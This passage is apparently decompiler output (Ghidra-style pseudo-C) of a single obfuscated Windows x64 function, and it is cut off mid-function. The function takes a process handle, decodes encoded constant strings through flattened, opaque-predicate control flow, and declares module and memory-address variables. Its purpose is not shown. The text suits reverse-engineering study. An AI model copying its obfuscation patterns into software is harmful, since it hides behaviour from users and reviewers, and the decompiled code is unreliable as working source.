/* Longer-timeout retries for functions that failed the primary export. */

/* ==================================================================== */
/* 140019a20 / FUN_140019a20 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined8 FUN_140019a20(longlong param_1)

{
  HANDLE hProcess;
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined8 *puVar4;
  undefined8 *puVar5;
  char cVar6;
  byte bVar7;
  LPVOID lpBaseAddress;
  HMODULE pHVar8;
  undefined8 uVar9;
  undefined8 *puVar10;
  byte bVar11;
  byte bVar12;
  byte *lpModuleName;
  undefined8 *puVar13;
  undefined4 *puVar14;
  longlong lVar15;
  ulonglong uVar16;
  ulonglong uVar17;
  undefined2 *puVar18;
  ulonglong uVar19;
  ulonglong uVar20;
  byte bVar21;
  char cVar22;
  ulonglong uVar23;
  longlong lVar24;
  ulonglong uVar25;
  DWORD in_stack_00783d9d;
  DWORD in_stack_00935bb4;
  DWORD in_stack_0097a7b6;
  int in_stack_00e3ff49;
  DWORD in_stack_00e465ed;
  undefined8 in_stack_0105b243;
  undefined8 in_stack_0146c5ec;
  undefined4 in_stack_01482530;
  DWORD in_stack_0153e904;
  undefined4 in_stack_015acc22;
  DWORD in_stack_015d9ac8;
  DWORD in_stack_01676d00;
  DWORD in_stack_016f6824;
  int in_stack_01729634;
  undefined1 auStackY_5f8 [32];
  byte local_5c8;
  undefined1 local_5b0 [32];
  undefined1 local_590 [39];
  byte bStack_569;
  undefined4 local_568;
  undefined8 local_564;
  undefined8 uStack_55c;
  byte bStack_549;
  DWORD local_548;
  undefined8 local_544;
  undefined8 uStack_53c;
  undefined8 local_534;
  byte bStack_529;
  DWORD local_528;
  undefined8 local_524;
  undefined8 uStack_51c;
  undefined4 local_514;
  undefined2 local_510;
  undefined1 local_50e;
  byte abStack_509 [32];
  byte bStack_4e9;
  undefined4 local_4e8;
  undefined4 local_4e4;
  undefined4 local_4e0;
  undefined1 local_4dc;
  undefined8 local_4db;
  undefined8 uStack_4d3;
  undefined2 local_4cb;
  undefined1 local_4c9;
  undefined1 local_4c8 [31];
  byte bStack_4a9;
  undefined2 local_4a8;
  undefined1 local_4a6;
  undefined8 local_4a5;
  undefined8 uStack_49d;
  undefined2 local_495;
  byte bStack_489;
  undefined4 local_488;
  undefined4 uStack_484;
  undefined8 local_480;
  undefined4 local_478;
  undefined1 local_474;
  byte bStack_469;
  undefined4 local_468;
  undefined4 local_464;
  undefined2 local_460;
  undefined4 local_45e;
  undefined2 local_45a;
  undefined1 local_458;
  undefined1 local_448 [31];
  byte bStack_429;
  undefined4 local_428;
  undefined4 local_424;
  undefined2 local_420;
  undefined1 local_41e;
  undefined8 local_41d;
  undefined8 uStack_415;
  undefined1 local_40d;
  undefined1 local_408 [31];
  byte bStack_3e9;
  int local_3e8;
  undefined8 local_3e4;
  undefined4 local_3dc;
  undefined2 local_3d8;
  byte bStack_3c9;
  DWORD local_3c8;
  undefined8 local_3c4;
  undefined8 uStack_3bc;
  undefined2 local_3b4;
  byte bStack_3a9;
  undefined4 local_3a8;
  undefined4 local_3a4;
  undefined2 local_3a0;
  undefined8 local_39e;
  undefined2 local_396;
  byte bStack_389;
  DWORD local_388;
  undefined8 local_384;
  undefined8 uStack_37c;
  undefined2 local_374;
  undefined1 local_372;
  undefined1 local_368 [63];
  byte bStack_329;
  undefined4 local_328;
  undefined4 local_324;
  undefined4 local_320;
  undefined4 local_31c;
  undefined4 local_318;
  undefined4 local_314;
  undefined4 local_310;
  undefined4 local_30c;
  undefined4 local_308;
  undefined4 local_304;
  undefined4 local_300;
  undefined4 local_2fc;
  undefined4 local_2f8;
  undefined4 local_2f4;
  undefined4 local_2f0;
  undefined4 local_2ec;
  undefined1 local_2e8;
  undefined8 local_2e7;
  undefined8 uStack_2df;
  undefined8 local_2d7;
  undefined2 local_2cf;
  undefined1 local_2cd;
  undefined8 local_2c8 [34];
  undefined1 local_1b8 [32];
  LPVOID local_198;
  undefined8 local_190;
  undefined8 local_188 [32];
  undefined8 local_88;
  HANDLE local_78;
  longlong local_70;
  LPCVOID local_68;
  longlong lStack_60;
  undefined8 local_58;
  undefined1 local_50 [32];
  ulonglong local_30;

  local_30 = DAT_14005d040 ^ (ulonglong)auStackY_5f8;
  hProcess = *(HANDLE *)(*(longlong *)(param_1 + 0x58) + 0x30);
  FUN_140018190(local_50);
  FUN_140023030(local_5b0,local_50,0);
  cVar6 = FUN_14000f940(local_5b0);
  FUN_140023190(local_5b0);
  if (cVar6 == '\0') {
LAB_140022c8b:
    uVar9 = 0;
LAB_140022c8d:
    FUN_140025000(local_50);
    return uVar9;
  }
  local_328 = 0x48724f75;
  local_324 = 0x52524049;
  local_320 = 0x57505b5c;
  local_31c = 0x485b5946;
  local_318 = 0x5e5d525e;
  local_314 = 0x9cb2ae50;
  local_310 = 0x98a4a29c;
  local_30c = 0xacba969a;
  local_308 = 0xa0a2a2ab;
  local_304 = 0xb78fbea1;
  local_300 = 0xb6b7a6a1;
  local_2fc = 0x84bcbab3;
  local_2f8 = 0xb0b2acb8;
  local_2f4 = 0x828e82be;
  local_2f0 = 0x87878581;
  local_2ec = 0x98b48e88;
  local_2e8 = 0x46;
  local_2e7 = 0;
  uStack_2df = 0;
  local_2d7 = 0;
  local_2cf = 0;
  local_2cd = 0;
  bVar21 = local_5c8;
LAB_140019b82:
  uVar17 = DAT_140a618c8;
  uVar20 = DAT_140a618d0;
LAB_140019b90:
  uVar23 = 0;
LAB_140019b93:
  if (uVar23 < 0x5c) goto code_r0x000140019b9d;
  puVar14 = &local_328;
LAB_14001a5c9:
  FUN_140023550(local_590,puVar14);
  bVar7 = FUN_14004e470(local_50,local_590);
  FUN_140025000(local_590);
  local_568 = 0x6b6a6d54;
  local_564 = 0;
  uStack_55c = 0;
  bVar21 = local_5c8;
LAB_14001a610:
  uVar20 = DAT_140a618c8;
  uVar17 = DAT_140a618d0;
LAB_14001a620:
  uVar16 = 0;
  uVar23 = uVar17;
LAB_14001a622:
  if (uVar16 < 0x14) {
    bVar11 = local_590[uVar16 + 0x28];
    cVar6 = (char)uVar16;
LAB_14001a640:
    if (uVar16 < uVar20) goto LAB_14001b000;
    if (uVar23 + 1 <= uVar20) {
      if (uVar20 == uVar23 + 1) {
        bVar21 = cVar6 - 0x2a;
        cVar6 = '\x13';
        goto LAB_14001af99;
      }
      if (uVar20 == uVar23 + 2) {
        bVar21 = ('9' - (bVar11 & cVar6 + 0x82U)) * '\x02' + bVar11 + cVar6 + 0x82U;
        goto LAB_14001af78;
      }
      if (uVar20 != uVar23 + 3) {
        if (uVar20 != uVar23 + 5) goto LAB_14001a6a0;
        cVar22 = ('\x1e' - (cVar6 - 10U & bVar11)) * '\x02' + cVar6;
        goto LAB_14001af12;
      }
      bVar21 = cVar6 + (cVar6 + 0x2eU & bVar11) * -2 + -0x14 + bVar11;
      goto LAB_14001a622;
    }
    bVar21 = (cVar6 - 0xeU) + (cVar6 - 0xeU & bVar11) * -2 + 'b' + bVar11;
LAB_14001a6a0:
    if (uVar16 < uVar23) {
      in_stack_015acc22 = in_stack_01482530;
      goto LAB_14001b000;
    }
    if (uVar23 + 1 <= uVar20) {
      if (uVar20 != uVar23 + 1) {
        if (uVar20 == uVar23 + 2) {
          cVar22 = cVar6 + (cVar6 + 0x6aU & bVar11) * -2 + -0x7c;
          goto LAB_14001aebb;
        }
        if (uVar20 != uVar23 + 4) goto LAB_14001a6f0;
        bVar21 = cVar6 + 0x16;
        cVar22 = '>';
        goto LAB_14001ae3a;
      }
      cVar22 = cVar6 + (cVar6 + 0xbeU & bVar11) * -2 + -0x74;
      goto LAB_14001af12;
    }
    bVar21 = bVar11 + (cVar6 - 0x26U & bVar11) * -2 + -0x1c + cVar6;
LAB_14001a6f0:
    while (uVar17 = uVar23, uVar16 < uVar20 + uVar23) {
      while( true ) {
        do {
          uVar23 = uVar17;
          if (uVar20 == uVar23 + 0x80) {
            cVar22 = ('\f' - (cVar6 - 4U & bVar11)) * '\x02' + cVar6;
            goto LAB_14001af12;
          }
          if (uVar20 == uVar23 + 0x40) {
            bVar21 = (bVar11 + cVar6 + (cVar6 - 0x20U & bVar11) * -2) - 0x40;
            uVar23 = uVar23 + 1;
            goto LAB_14001a622;
          }
          if (uVar20 == uVar23 + 1) {
            bVar21 = ('4' - (cVar6 - 0x3cU & bVar11)) * '\x02' + cVar6 + bVar11;
            goto LAB_14001a622;
          }
          if (uVar20 == uVar23 + 0x41) {
            bVar21 = cVar6 + 0xa8;
            goto LAB_14001ab73;
          }
          if (uVar20 == uVar23 + 0x20) {
            bVar21 = bVar11 + cVar6 + (cVar6 + 0x8cU & bVar11) * -2 + 0xb8;
            uVar20 = uVar20 + uVar23;
            goto LAB_14001af78;
          }
          if (uVar20 == uVar23 + 9) {
            bVar21 = ('0' - (cVar6 + 0x70U & bVar11)) * '\x02' + cVar6 + bVar11;
            goto LAB_14001af78;
          }
          if (uVar20 == uVar23 + 0x61) {
            bVar21 = cVar6 + 0x54;
            cVar22 = '\x04';
            goto LAB_14001ae3a;
          }
          if (uVar20 == uVar23 + 1000) {
            bVar21 = bVar11 + cVar6 + (cVar6 + 0x38U & bVar11) * -2 + 0xb0;
            goto LAB_14001ae6c;
          }
          if (uVar20 == uVar23 + 6) {
            bVar21 = (',' - (cVar6 + 0x1cU & bVar11)) * '\x02' + cVar6 + bVar11;
            uVar16 = uVar16 + (byte)local_590[uVar16 + 0x28] + uVar23 + 1;
            goto LAB_14001a622;
          }
          uVar17 = uVar23;
        } while (uVar20 == uVar23 + 3);
        uVar20 = uVar23 + 0x42;
        uVar17 = uVar23 + 0xc2;
        if (uVar20 < uVar23 + 0xc4) {
          bVar21 = (bVar11 + cVar6 + (cVar6 - 0x2aU & bVar11) * -2) - 4;
          goto LAB_14001a610;
        }
        if (uVar20 < uVar23 + 0x11c) {
          bVar21 = bVar11 + cVar6 + (cVar6 + 0xbaU & bVar11) * -2 + 0xa4;
          goto LAB_14001a620;
        }
        if (uVar20 < uVar23 + 0xea) {
          bVar21 = ('&' - (cVar6 + 0x9eU & bVar11)) * '\x02' + bVar11 + cVar6;
          uVar23 = uVar17;
          goto LAB_14001a640;
        }
        if (uVar20 < uVar23 + 0xcc) {
          bVar21 = bVar11 + (cVar6 + 0x82U & bVar11) * -2 + -0xc + cVar6;
          uVar23 = uVar17;
          goto LAB_14001a6a0;
        }
        if (uVar20 < uVar23 + 0x13c) break;
        if (uVar20 < uVar23 + 0x4c2) {
          bVar21 = cVar6 + 0x4a;
          cVar22 = '\"';
          uVar23 = uVar17;
          goto LAB_14001aaab;
        }
        if (uVar20 < uVar23 + 0xca) {
          cVar22 = cVar6 + (cVar6 + 0x2eU & bVar11) * -2 + -0x14;
          uVar23 = uVar17;
          goto LAB_14001aa6e;
        }
        if (uVar20 < uVar23 + 0xc6) {
          bVar21 = bVar11 + (bVar11 & cVar6 + 0x12U) * -2 + -0x7e + cVar6 + 0x12U;
          uVar23 = uVar17;
          goto LAB_14001aa38;
        }
        if (uVar20 < uVar23 + 0x2c2) {
          bVar21 = ('#' - (bVar11 & cVar6 - 10U)) * '\x02' + bVar11 + (cVar6 - 10U);
          uVar23 = uVar17;
          goto LAB_14001aa12;
        }
        if (uVar23 + 0x104 <= uVar20) {
          uVar20 = uVar23 + 0xec;
          uVar17 = uVar23 + 0x10c;
          if (uVar23 + 0x14c < uVar20) {
            bVar21 = (bVar11 + cVar6 + (cVar6 + 0xb0U & bVar11) * -2) - 0x20;
            uVar16 = uVar16 + (byte)local_590[uVar16 + 0x28] + uVar17 + 1;
            uVar23 = uVar17;
            goto LAB_14001a622;
          }
          if (uVar23 + 0x11c < uVar20) {
            bVar21 = bVar11 + cVar6 + (cVar6 + 0x94U & bVar11) * -2 + 0x88;
            uVar23 = uVar17;
            goto LAB_14001ae6c;
          }
          if (uVar23 + 0x14d < uVar20) {
            bVar21 = cVar6 + 0x78;
            cVar22 = '\x18';
            uVar23 = uVar17;
            goto LAB_14001ae3a;
          }
          if (uVar23 + 0x110c < uVar20) {
            bVar21 = (bVar11 + cVar6 + (cVar6 + 0x5cU & bVar11) * -2) - 0x28;
            uVar23 = uVar17;
            goto LAB_14001af78;
          }
          if (uVar23 + 0x115 < uVar20) {
            bVar21 = bVar11 + cVar6 + (cVar6 + 0x40U & bVar11) * -2 + 0x80;
            uVar20 = uVar20 + uVar17;
            uVar23 = uVar17;
            goto LAB_14001af78;
          }
          if (uVar23 + 0x111 < uVar20) {
            cVar22 = ('\x14' - (cVar6 + 0x24U & bVar11)) * '\x02' + cVar6;
            uVar23 = uVar17;
            goto LAB_14001aebb;
          }
          if (uVar23 + 0x10e < uVar20) {
            bVar21 = (bVar11 + cVar6 + (cVar6 + 8U & bVar11) * -2) - 0x30;
            uVar23 = uVar17;
            goto LAB_14001a622;
          }
          if (uVar23 + 0x170 < uVar20) {
            bVar21 = ('<' - (cVar6 - 0x14U & bVar11)) * '\x02' + cVar6 + bVar11;
            uVar23 = uVar23 + 0x10d;
            goto LAB_14001a622;
          }
          if (uVar23 + 0x134 < uVar20) {
            cVar22 = ('\x10' - (cVar6 - 0x30U & bVar11)) * '\x02' + cVar6;
            uVar23 = uVar17;
            goto LAB_14001af12;
          }
          if (uVar20 <= uVar23 + 0x136) {
            uVar20 = uVar23 + 300;
            uVar17 = uVar23 + 0x1a6;
          }
        }
      }
      bVar21 = bVar11 + (cVar6 + 0x66U & bVar11) * -2 + -100 + cVar6;
      uVar23 = uVar17;
    }
    if (uVar20 < uVar23 + 1) {
      bVar21 = cVar6 - 0xe;
      cVar22 = '*';
LAB_14001aaab:
      bVar21 = (cVar22 - (bVar21 & bVar11)) * '\x02' + cVar6 + bVar11;
LAB_14001aab7:
      if (uVar20 + uVar23 != 0x5a) {
        if (uVar23 + 0x10 < uVar20) {
          cVar22 = ('\x02' - (cVar6 + 0xaaU & bVar11)) * '\x02' + cVar6;
LAB_14001aa6e:
          bVar21 = cVar22 + bVar11;
        }
        else {
          if (uVar20 == uVar23 + 1) {
            cVar22 = cVar6 + (cVar6 + 0x8eU & bVar11) * -2 + -0x54;
LAB_14001af12:
            bVar21 = cVar22 + bVar11;
            goto LAB_14001af15;
          }
          if (uVar20 == uVar23 + 2) {
            cVar22 = cVar6 + (cVar6 + 0x3aU & bVar11) * -2 + -0x5c;
            goto LAB_14001aebb;
          }
          if (uVar20 == uVar23 + 5) {
            bVar21 = (bVar11 + cVar6 + (cVar6 + 2U & bVar11) * -2) - 0xc;
            goto LAB_14001af78;
          }
          if (uVar20 == uVar23 + 4) {
            bVar21 = bVar11 + cVar6 + (cVar6 - 0x1aU & bVar11) * -2 + 0x9c;
            goto LAB_14001ae48;
          }
          if (uVar20 == uVar23 + 3) {
            bVar21 = ('\"' - (cVar6 - 0x36U & bVar11)) * '\x02' + cVar6 + bVar11;
            goto LAB_14001ae6c;
          }
          if (uVar20 == uVar23 + 2) {
            bVar21 = cVar6 + 0xae;
            cVar6 = '\x1f';
LAB_14001af99:
            bVar21 = (cVar6 - (bVar11 & bVar21)) * '\x02' + bVar11 + bVar21;
            uVar16 = uVar16 + (byte)local_590[uVar16 + 0x28] + uVar23 + 1;
            goto LAB_14001a622;
          }
        }
        if (uVar20 < 0x10) {
          if (uVar23 + 0x61 < uVar20) {
            bVar21 = cVar6 + (cVar6 + 0x84U & bVar11) * -2 + -0x18 + bVar11;
          }
          else {
            if (uVar20 == uVar23 + 1) {
              bVar21 = bVar11 + cVar6 + (cVar6 + 0x68U & bVar11) * -2 + 0x90;
              uVar16 = uVar16 + (byte)local_590[uVar16 + 0x28] + uVar23 + 1;
              goto LAB_14001a622;
            }
            if (uVar20 == uVar23 + 2) {
              bVar21 = (bVar11 + cVar6 + (cVar6 + 0x30U & bVar11) * -2) - 0x20;
              goto LAB_14001ae48;
            }
            if (uVar20 == uVar23 + 5) {
              bVar21 = ('\x18' - (cVar6 - 8U & bVar11)) * '\x02' + cVar6 + bVar11;
              uVar20 = uVar20 + uVar23;
              goto LAB_14001af78;
            }
            if (uVar20 == uVar23 + 4) {
              bVar21 = bVar11 + cVar6 + (cVar6 - 0x40U & bVar11) * -2 + 0x80;
              goto LAB_14001a622;
            }
          }
LAB_14001aa38:
          if (uVar23 < 0x61) {
LAB_14001aa12:
            local_590[uVar16 + 0x28] = bVar21;
            uVar16 = uVar16 + 1;
            goto LAB_14001a622;
          }
          bVar21 = (cVar6 + (cVar6 + 0x6cU & bVar11) * -2 + bVar11) * '\x02' - 0x10;
LAB_14001af15:
          local_590[uVar16 + 0x28] =
               ('7' - (bVar11 & cVar6 + 0x5eU)) * '\x02' + bVar11 + cVar6 + 0x5eU;
          uVar23 = uVar23 + 1;
          goto LAB_14001a622;
        }
        bVar21 = ((bVar11 - (cVar6 + 0x50U & bVar11)) + '\x10') * '\x02' + cVar6;
LAB_14001aebe:
        local_590[uVar16 + 0x28] =
             ('\x19' - (bVar11 & cVar6 + 0x42U)) * '\x02' + bVar11 + cVar6 + 0x42U + bVar21;
        uVar20 = uVar20 + uVar23;
LAB_14001af78:
        uVar16 = uVar16 - bVar21;
        goto LAB_14001a622;
      }
      bVar21 = (cVar6 + (cVar6 + 0x34U & bVar11) * -2) - 0x38;
    }
    else {
      if (uVar20 == uVar23 + 1) {
        bVar21 = (bVar11 + cVar6 + (cVar6 + 0xb4U & bVar11) * -2) - 0x38;
        uVar16 = uVar16 + (byte)local_590[uVar16 + 0x28] + uVar23 + 1;
        goto LAB_14001a622;
      }
      if (uVar20 != uVar23 + 3) {
        if (uVar20 == uVar23 + 4) {
          bVar21 = ('4' - (cVar6 + 0x44U & bVar11)) * '\x02' + cVar6 + bVar11;
          uVar20 = uVar20 + uVar23;
          goto LAB_14001af78;
        }
        if (uVar20 != uVar23 + 5) {
          if (uVar20 == uVar23 + 2) {
            bVar21 = bVar11 + cVar6 + (cVar6 + 0xcU & bVar11) * -2 + 0xb8;
            goto LAB_14001a622;
          }
          goto LAB_14001aab7;
        }
        bVar21 = cVar6 + 0x28;
LAB_14001ab73:
        cVar22 = ('\b' - (bVar21 & bVar11)) * '\x02' + cVar6;
LAB_14001aebb:
        bVar21 = cVar22 + bVar11;
        goto LAB_14001aebe;
      }
      bVar21 = cVar6 + 0x7c;
      cVar22 = '\f';
LAB_14001ae3a:
      bVar21 = (cVar22 - (bVar21 & bVar11)) * '\x02' + cVar6 + bVar11;
    }
LAB_14001ae48:
    bVar12 = bVar11 + (bVar11 & cVar6 + 0x26U) * -2 + -10 + cVar6 + 0x26U;
    local_590[uVar16 + 0x28] = bVar12;
    uVar16 = uVar16 - ((ulonglong)bVar12 + uVar23 + 1);
    uVar23 = uVar23 + 1;
LAB_14001ae6c:
    bVar12 = (char)uVar16 + 0x18;
    local_590[uVar16 + 0x28] = (',' - (bVar11 & bVar12)) * '\x02' + bVar11 + bVar12;
    uVar20 = uVar20 + 1;
    lVar24 = uVar16 + (-1 - uVar20);
    uVar16 = lVar24 + (byte)local_590[lVar24 + 0x28] + uVar23 + 1;
    goto LAB_14001a622;
  }
  in_stack_015acc22 = local_568;
LAB_14001b000:
  if (((byte)in_stack_015acc22 & bVar7) == 0) goto LAB_140022c8b;
  local_548 = 0x43424d48;
  local_544 = 0;
  uStack_53c = 0;
  local_534 = 0;
  bVar21 = local_5c8;
LAB_14001b030:
  uVar20 = DAT_140a618c8;
  uVar17 = DAT_140a618d0;
LAB_14001b040:
  uVar25 = 0;
  uVar23 = uVar20;
  uVar16 = uVar17;
LAB_14001b043:
  if (uVar25 < 0x1c) {
    bVar7 = abStack_509[uVar25 - 0x3f];
    cVar6 = (char)uVar25;
    while (uVar23 <= uVar25) {
      uVar20 = uVar16 + 1;
      if (uVar20 <= uVar23) {
        if (uVar23 == uVar20) {
          bVar21 = ('\t' - (bVar7 & cVar6 + 0x22U)) * '\x02' + bVar7 + cVar6 + 0x22U;
          uVar25 = uVar25 + abStack_509[uVar25 - 0x3f] + uVar16 + 1;
        }
        else {
          if (uVar23 != uVar16 + 2) goto LAB_14001b0a7;
          bVar21 = ('\x0f' - (bVar7 & cVar6 + 0x8eU)) * '\x02' + bVar7 + cVar6 + 0x8eU;
LAB_14001b6ba:
          bVar11 = (char)uVar25 - 0x38;
          abStack_509[uVar25 - 0x3f] = bVar11 + (bVar11 & bVar7) * -2 + -0x78 + bVar7;
          lVar24 = uVar25 + (-1 - (uVar23 + 1));
          uVar25 = lVar24 + abStack_509[lVar24 + -0x3f] + uVar16 + 1;
          uVar23 = uVar23 + 1;
        }
        goto LAB_14001b043;
      }
      bVar21 = bVar7 + (bVar7 & cVar6 + 0xb6U) * -2 + cVar6 + -0x44;
LAB_14001b0a7:
      if (uVar25 < uVar16) {
        in_stack_0097a7b6 = in_stack_01676d00;
        break;
      }
      if (uVar16 + 0x1000 <= uVar23) {
        if (uVar23 == uVar20) {
          bVar21 = (bVar7 + cVar6 + (cVar6 + 0x5aU & bVar7) * -2) - 0x1c;
LAB_14001b673:
          abStack_509[uVar25 - 0x3f] =
               ('5' - (bVar7 & cVar6 + 0x3aU)) * '\x02' + bVar7 + cVar6 + 0x3aU;
          uVar16 = uVar16 + 1;
        }
        else if (uVar23 == uVar16 + 2) {
          bVar21 = ('.' - (cVar6 - 0x3aU & bVar7)) * '\x02' + cVar6 + bVar7;
          uVar16 = uVar16 + 1;
        }
        else {
          if (uVar23 != uVar16 + 2) {
            if (uVar23 != uVar16 + 5) {
              if (uVar23 != uVar16 + 3) goto code_r0x00014001b120;
              cVar22 = cVar6 + (cVar6 - 0x1eU & bVar7) * -2 + -0x4c;
LAB_14001b5b7:
              bVar21 = cVar22 + bVar7;
LAB_14001b5ba:
              bVar11 = bVar7 + (bVar7 & cVar6 + 0x12U) * -2 + -0x7e + cVar6 + 0x12U;
              abStack_509[uVar25 - 0x3f] = bVar11;
              uVar25 = uVar25 - ((ulonglong)bVar11 + uVar16 + 1);
              uVar16 = uVar16 + 1;
              goto LAB_14001b6ba;
            }
            bVar21 = ('\x1e' - (cVar6 + 0x76U & bVar7)) * '\x02' + cVar6 + bVar7;
            goto LAB_14001b601;
          }
          bVar21 = (bVar7 + cVar6 + (cVar6 + 0x32U & bVar7) * -2) - 0x2c;
        }
        goto LAB_14001b043;
      }
      bVar21 = ('6' - (cVar6 - 0x12U & bVar7)) * '\x02' + bVar7 + cVar6;
code_r0x00014001b120:
      if (uVar23 + uVar16 <= uVar25) {
        if (uVar23 < uVar16 + 0x41) {
          bVar21 = ('\x03' - (cVar6 + 0xb6U & bVar7)) * '\x02' + cVar6 + 0xb6U + bVar7;
        }
        else {
          if (uVar23 == uVar16 + 1) {
            bVar21 = (bVar7 + (cVar6 - 0x24U) + (cVar6 - 0x24U & bVar7) * -2) - 4;
            uVar25 = uVar25 + abStack_509[uVar25 - 0x3f] + uVar16 + 1;
            goto LAB_14001b043;
          }
          if (uVar23 == uVar16 + 2) {
            bVar21 = ('\x04' - (cVar6 + 0x48U & bVar7)) * '\x02' + cVar6 + 0x48U + bVar7;
            goto LAB_14001b6ba;
          }
          if (uVar23 == uVar16 + 2) {
            cVar22 = ('\n' - (cVar6 + 0xb4U & bVar7)) * '\x02' + cVar6 + 0xb4U;
            goto LAB_14001b5b7;
          }
        }
        if (uVar16 + uVar23 == 4) {
          bVar21 = (cVar6 + (cVar6 + 0x5cU & bVar7) * -2) - 0x28;
          goto LAB_14001b5ba;
        }
        uVar20 = uVar16 + 1;
        if (uVar20 < uVar23) {
          bVar21 = ('7' - (cVar6 + 0x5eU & bVar7)) * '\x02' + cVar6 + 0x5eU + bVar7;
        }
        else {
          if (uVar23 == uVar20) {
            bVar21 = ('=' - (cVar6 - 0x36U & bVar7)) * '\x02' + (cVar6 - 0x36U) + bVar7;
            goto LAB_14001b673;
          }
          if (uVar23 == uVar16 + 2) {
            bVar21 = bVar7 + cVar6 + 0x36U + (cVar6 + 0x36U & bVar7) * -2 + 0x86;
            uVar16 = uVar16 + 1;
            goto LAB_14001b043;
          }
          if (uVar23 == uVar16 + 2) {
            bVar21 = bVar7 + (cVar6 - 0x1aU) + (cVar6 - 0x1aU & bVar7) * -2 + 0xb6;
            goto LAB_14001b601;
          }
          if (uVar23 == uVar16 + 5) {
            bVar21 = (bVar7 + cVar6 + 0x52U + (cVar6 + 0x52U & bVar7) * -2) - 0x3e;
            goto LAB_14001b5ba;
          }
        }
        if (uVar23 < 4) {
          if (uVar20 < uVar23) {
            bVar21 = (bVar7 + cVar6 + 0x4cU + (cVar6 + 0x4cU & bVar7) * -2) - 0x14;
          }
          else {
            if (uVar23 == uVar20) {
              bVar21 = (bVar7 + cVar6 + 0xb8U + (cVar6 + 0xb8U & bVar7) * -2) - 8;
              uVar25 = uVar25 + abStack_509[uVar25 - 0x3f] + uVar16 + 1;
              goto LAB_14001b043;
            }
            if (uVar23 == uVar16 + 2) {
              bVar21 = ('\x02' - (cVar6 + 0x24U & bVar7)) * '\x02' + cVar6 + 0x24U + bVar7;
              goto LAB_14001b6ba;
            }
            if (uVar23 == uVar16 + 5) {
              bVar21 = (' ' - (cVar6 + 0x40U & bVar7)) * '\x02' + cVar6 + 0x40U + bVar7;
              goto LAB_14001b043;
            }
          }
          if (3 < uVar16) {
            bVar21 = (cVar6 + (cVar6 + 0x84U & bVar7) * -2 + bVar7) * '\x02' - 0x30;
            goto LAB_14001b673;
          }
          abStack_509[uVar25 - 0x3f] = bVar21;
          uVar25 = uVar25 + 1;
        }
        else {
          bVar21 = ((bVar7 - (cVar6 - 0x10U & bVar7)) + '0') * '\x02' + cVar6;
LAB_14001b566:
          abStack_509[uVar25 - 0x3f] =
               (';' - (bVar7 & cVar6 + 0xa6U)) * '\x02' + bVar7 + bVar21 + cVar6 + 0xa6U;
          uVar23 = uVar23 + uVar16;
LAB_14001b601:
          uVar25 = uVar25 - bVar21;
        }
        goto LAB_14001b043;
      }
      while( true ) {
        if (uVar23 == uVar16 + 0x41) {
          bVar21 = (bVar7 + cVar6 + (cVar6 + 0x34U & bVar7) * -2) - 0x38;
          goto LAB_14001b673;
        }
        if (uVar23 == uVar16 + 1) {
          bVar21 = (' ' - (cVar6 + 0xa0U & bVar7)) * '\x02' + cVar6 + bVar7;
          uVar16 = uVar16 + 1;
          goto LAB_14001b043;
        }
        uVar20 = uVar16 + 4;
        if (uVar23 == uVar20) {
          bVar21 = bVar7 + cVar6 + (cVar6 + 0xcU & bVar7) * -2 + 0xb8;
          goto LAB_14001b043;
        }
        if (uVar23 == uVar16 + 8) {
          bVar21 = ('\x18' - (cVar6 + 0x78U & bVar7)) * '\x02' + cVar6 + bVar7;
          goto LAB_14001b566;
        }
        uVar17 = uVar16 + 5;
        if (uVar20 < uVar16 + 0xd) {
          bVar21 = ('\x1a' - (cVar6 + 0x22U & bVar7)) * '\x02' + cVar6 + bVar7;
          goto LAB_14001b030;
        }
        if (uVar20 < uVar16 + 6) {
          bVar21 = bVar7 + cVar6 + (cVar6 + 0x8eU & bVar7) * -2 + 0xac;
          goto LAB_14001b040;
        }
        uVar19 = uVar16 + 9;
        if (uVar20 < uVar19) break;
        uVar20 = uVar16 + 10;
        uVar23 = uVar19;
        if (uVar16 + 0x12 < uVar19) {
          bVar21 = bVar7 + cVar6 + (cVar6 + 0x10U & bVar7) * -2 + 0xa0;
          uVar25 = uVar25 + abStack_509[uVar25 - 0x3f] + uVar20 + 1;
          uVar16 = uVar20;
          goto LAB_14001b043;
        }
        if (uVar16 + 0xb < uVar19) {
          bVar21 = ('\f' - (cVar6 + 0x7cU & bVar7)) * '\x02' + cVar6 + bVar7;
          uVar16 = uVar20;
          goto LAB_14001b6ba;
        }
        uVar23 = uVar16 + 0xe;
        if (uVar23 < uVar19) {
          cVar22 = cVar6 + (cVar6 - 0x18U & bVar7) * -2 + -0x70;
          uVar23 = uVar19;
          uVar16 = uVar20;
          goto LAB_14001b5b7;
        }
        if (uVar16 + 0x1a < uVar19) {
          bVar21 = (bVar7 + cVar6 + (cVar6 + 4U & bVar7) * -2) - 0x18;
          uVar23 = uVar19;
          uVar16 = uVar16 + 0xb;
          goto LAB_14001b043;
        }
        uVar16 = uVar16 + 0x1e;
      }
      bVar21 = ('\x12' - (cVar6 - 6U & bVar7)) * '\x02' + bVar7 + cVar6;
      uVar16 = uVar17;
      uVar23 = uVar20;
    }
  }
  else {
    in_stack_0097a7b6 = local_548;
  }
  local_528 = 0x33340536;
  local_524 = 0;
  uStack_51c = 0;
  local_514 = 0;
  local_510 = 0;
  local_50e = 0;
  bVar21 = local_5c8;
LAB_14001b7a0:
  uVar17 = DAT_140a618c8;
  uVar20 = DAT_140a618d0;
LAB_14001b7b0:
  uVar16 = 0;
  uVar23 = uVar20;
LAB_14001b7b2:
  if (uVar16 < 0x1b) {
    bVar7 = abStack_509[uVar16 - 0x1f];
    cVar6 = (char)uVar16;
LAB_14001b7c6:
    if (uVar16 < uVar17) goto LAB_14001c2de;
    if (uVar23 + 1 <= uVar17) {
      if (uVar17 == uVar23 + 1) {
        bVar21 = bVar7 + cVar6 + 0x6bU + (cVar6 + 0x6bU & bVar7) * -2 + 0x13;
        uVar16 = uVar16 + abStack_509[uVar16 - 0x1f] + uVar23 + 1;
      }
      else {
        if (uVar17 == uVar23 + 2) {
          bVar21 = bVar7 + cVar6 + 0x5dU + (cVar6 + 0x5dU & bVar7) * -2 + 0x75;
          goto LAB_14001c22d;
        }
        if (uVar17 == uVar23 + 3) {
          bVar21 = (bVar7 + cVar6 + 0x25U + (cVar6 + 0x25U & bVar7) * -2) - 3;
          goto LAB_14001c1da;
        }
        if (uVar17 != uVar23 + 7) goto LAB_14001b824;
        bVar21 = cVar6 + (cVar6 + 9U & bVar7) * -2 + -0x36 + bVar7;
        uVar23 = uVar23 + 1;
      }
